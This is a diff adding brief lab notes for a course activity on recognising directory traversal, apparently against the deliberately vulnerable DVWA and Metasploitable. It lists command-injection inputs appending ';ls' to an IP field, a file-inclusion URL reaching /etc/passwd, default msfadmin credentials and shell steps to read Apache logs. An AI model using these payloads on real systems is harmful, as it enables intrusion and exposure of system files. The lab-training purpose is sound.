@@ -1,0 +1,21 @@
+Activity 2.13.1 - Recognizing Directory Traversal
+
+8.8.8.8
+8.8.8.8;ls /
+8.8.8.8;ls /var
+8.8.8.8;ls /var/www
+8.8.8.8;ls /var/www/dvwa
+
+<Metasploitable IP>/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
+
+msfadmin
+msfadmin
+cd /
+ls
+cd var
+ls 
+cd log
+ls
+cd apache2
+ls
+cat access.log
